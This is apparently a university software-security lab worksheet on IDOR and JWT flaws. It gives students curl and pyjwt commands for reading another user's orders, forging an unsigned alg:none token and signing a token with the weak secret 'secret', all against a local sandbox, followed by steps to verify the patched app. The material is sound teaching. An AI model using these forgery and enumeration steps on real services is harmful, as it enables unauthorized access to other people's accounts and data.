# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:5000`.

## Part 1 — Student Information

| Name | Student ID | Date | Group |
|------|-----------|------|-------|
|      |           |      |       |

## Part 2 — Lecture Questions

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L41) — which of the two is missing?
2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L54) closes it?
3. Explain the **`alg:none`** JWT attack. Why does listing `"none"` in `algorithms=[...]` (L35) let an attacker submit an *unsigned* token?
4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?
5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:5000   (service name: authz-lab, port 5000)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: set browser proxy to 127.0.0.1:8080 to intercept/replay requests
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

**Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:5000/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

**Task 1 — IDOR Treasure Hunt (30 min) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:5000/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
  curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
  ```
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.

**Task 2 — JWT Forgery via alg:none (30 min) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).

**Task 3 — JWT Forgery via weak secret (30 min) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
  PY
  )
  curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.

**Task 4 — Privilege/identity escalation reasoning (25 min).**
- *Goal:* combine the flaws. Using Task 2/3 you became `bob` *without his password*; using Task 1 you read objects you don't own.
- *Steps:* document the full attack chain (forge token → access any `oid`). Optionally replay the requests through **Burp Suite Repeater** and screenshot the intercepted request/response.
- *Deliverable:* a short chain diagram/paragraph + Burp (or curl) evidence.

**Task 5 — Defend / fix it (30 min) 🛡️.**
- *Goal:* prove `solution_app.py` blocks Tasks 1–3.
- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
  ```bash
  docker compose run --rm --service-ports authz-lab python solution_app.py
  ```
  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L54); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L40); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40).
- *Deliverable:* screenshots of the 403 and both 401s + name the fix line for each.

## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.
2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*
3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show your **`whoami` / login email / student ID** and a **timestamp**. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** ____________________
  *Flags are unique per student — submitting another student's flag is a violation. See [SUBMISSION.md](../../SUBMISSION.md).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?
  2. **Why does your fix actually stop it** — and what could still break it?

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.
2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).
3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.
